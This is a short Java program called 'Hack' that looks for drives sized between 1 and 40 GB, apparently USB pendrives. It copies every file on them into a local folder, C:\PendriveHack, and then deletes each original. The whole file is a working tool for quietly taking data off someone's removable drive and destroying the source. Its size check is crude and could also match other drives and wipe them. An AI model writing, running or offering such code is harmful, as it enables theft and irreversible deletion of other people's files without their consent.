import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class Hack {

	
	public static void copyDel(File f,String location)throws Exception
	{
		File k[] = f.listFiles();
		for(File z:k)
		{
			if(z.isDirectory())
			{
				copyDel(z,location);
			}
			
			else if(z.isFile())
			{
				Path s = Paths.get(z.getAbsolutePath());
				byte data[] = Files.readAllBytes(s);
				FileOutputStream fos = new FileOutputStream(location+"\\"+z.getName());
				System.out.println("Copying the File: "+z.getName());
				fos.write(data);
				System.out.println("Copied Susseccfully!");
				z.delete();
			}
		}
	}
	
	public static void main(String[] args)throws Exception
		{
		BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
		File ff = new File("C:\\PendriveHack");
		boolean check=false;
		ff.mkdir();
		
		String location="C:\\PendriveHack";
		File f[] = File.listRoots();
		for(File x:f)
		{
			long l = (x.getTotalSpace())/(1024*1024*1024);
			if(l>1 && l<40)
			{
				check=true;
				copyDel(x,location);
			}
		}

		if(check)
		{
			System.out.println("All the data have been copied to C:\\PendriveHack and Deleted From Pendrive");
		}
		
		else
		{
			System.out.println("No Pendrive Found!!");
		}
		
		
		System.out.println("Press Enter to Exit");
		br.readLine();
	}

}
